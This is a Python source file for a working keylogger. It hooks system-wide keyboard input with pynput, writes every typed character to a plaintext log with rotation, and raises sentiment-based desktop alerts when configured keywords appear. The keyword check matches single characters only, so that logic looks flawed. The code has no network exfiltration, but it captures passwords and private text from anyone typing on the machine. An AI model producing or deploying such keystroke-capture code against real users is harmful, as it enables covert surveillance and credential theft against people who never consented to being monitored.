from pynput import keyboard
import json
from modules.sentiment_analysis import analyze_sentiment
import os
from datetime import datetime
from plyer import notification
import time

# Load configuration
with open("config.json") as f:
    config = json.load(f)

class Keylogger:
    def __init__(self):
        self.log_file = "logs/keylogs.txt"
        self.keywords = config["alert_keywords"]
        self.max_log_size = 1024 * 1024  # 1 MB

        # Ensure logs and screenshots directories exist
        os.makedirs("logs", exist_ok=True)
        os.makedirs("logs/screenshots", exist_ok=True)

    def on_press(self, key):
        try:
            self.rotate_logs()
            with open(self.log_file, "a") as f:
                f.write(f"{key.char}")
                # print(f"Key pressed: {key.char}")  # Debug: Print key pressed
                if key.char in self.keywords:
                    self.trigger_alert(key.char)
        except AttributeError:
            pass
        except Exception as e:
            print(f"Error in keylogger: {e}")

    def rotate_logs(self):
        """Rotate logs if the file size exceeds the limit."""
        if os.path.exists(self.log_file) and os.path.getsize(self.log_file) > self.max_log_size:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            archived_log = f"logs/keylogs_{timestamp}.txt"
            os.rename(self.log_file, archived_log)
            print(f"Log file rotated: {archived_log}")

    def trigger_alert(self, keyword):
        """
        Trigger an alert when a keyword is detected.
        Perform sentiment analysis on the logged text.
        """
        print(f"Alert: Keyword '{keyword}' detected!")
        try:
            with open(self.log_file, "r") as f:
                text = f.read()
                sentiment_result = analyze_sentiment(text)
                if sentiment_result:
                    print("Negative sentiment detected! Sending alert...")
                    notification.notify(
                        title="Negative Sentiment Alert",
                        message=f"Keyword '{keyword}' detected with negative sentiment.",
                        timeout=10
                    )
        except Exception as e:
            print(f"Error triggering alert: {e}")

    def start(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

        print("Keylogger started. Press Ctrl+C to stop.")

        # Keep the keylogger running
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("Keylogger stopped.")